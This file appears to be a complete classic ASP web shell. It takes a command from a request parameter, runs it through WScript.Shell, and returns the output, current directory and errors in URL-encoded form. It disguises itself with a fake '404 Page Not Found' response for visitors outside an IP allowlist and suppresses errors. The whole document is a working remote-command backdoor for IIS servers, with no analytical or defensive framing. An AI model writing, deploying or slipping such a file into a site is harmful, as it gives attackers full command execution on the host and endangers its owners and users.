<%
Server.ScriptTimeout = 180

ip=request.ServerVariables("REMOTE_ADDR")

If (InStr(1, "", ip, vbTextCompare) = 0) Then
	response.Status="404 Page Not Found"
	response.Write(response.Status)
	response.End
End If

On Error Resume Next
Err.Clear

cmd = Request.QueryString("cmd")
If (cmd = "") Then
	cmd = Request.Form("cmd")
End If

cwd = Request.QueryString("cwd")
If (cwd = "") Then
	cwd = Request.Form("cwd")
End If

If (cwd = "." Or cwd = "") Then
	set fso = CreateObject("Scripting.FileSystemObject")
	cwd = fso.GetFolder(".")
	set fso = nothing
End If

Dim wshell, intReturn, strPResult, strEResult
set wshell = Server.CreateObject("WScript.Shell")
wshell.CurrentDirectory = cwd

If (Left(cmd, 2) = "cd") Then
	newname = Right(cmd, len(cmd) - 3)
	set fso = CreateObject("Scripting.FileSystemObject")
	newdir = fso.BuildPath(cwd, newname)
	If (fso.FolderExists(newdir)) Then
		wshell.CurrentDirectory = newdir
		strPResult = "(message: cd succeeded)"
	Else
		strEResult = "Error: Folder does not exist."
	End If
Else
	Set objCmd = wShell.Exec(cmd)
	strPResult = objCmd.StdOut.Readall()
	strEResult = objCmd.StdErr.Readall()
End If

If Err.Number = 0 Then
	response.write "stdout=" & Server.URLEncode(strPResult) & "&stderr=" & Server.URLEncode(strEResult) & "&cwd=" & Server.URLEncode(wshell.CurrentDirectory)
Else
	response.write "stderr=" & Err.Source & " - " & Err.Description & "&cwd=" & cwd
End If

set wshell = nothing

%>
